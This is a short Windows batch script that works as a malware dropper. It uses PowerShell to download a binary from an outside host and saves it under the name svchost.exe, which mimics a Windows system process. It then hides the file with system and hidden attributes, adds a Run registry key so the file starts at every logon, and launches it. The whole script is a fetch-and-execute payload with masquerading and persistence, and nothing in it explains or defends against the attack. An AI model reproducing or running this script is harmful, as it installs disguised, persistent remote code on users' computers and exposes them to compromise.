@echo off
set URL=https://hihat.onrender.com/dist/hihat
set FILE=%TEMP%\svchost.exe

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%FILE%')"

move /Y "%FILE%" "%~dp0svchost.exe"
attrib +h +s "%~dp0svchost.exe"

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v HihatClient /t REG_SZ /d "%~dp0svchost.exe" /f

start "" "%~dp0svchost.exe"

exit
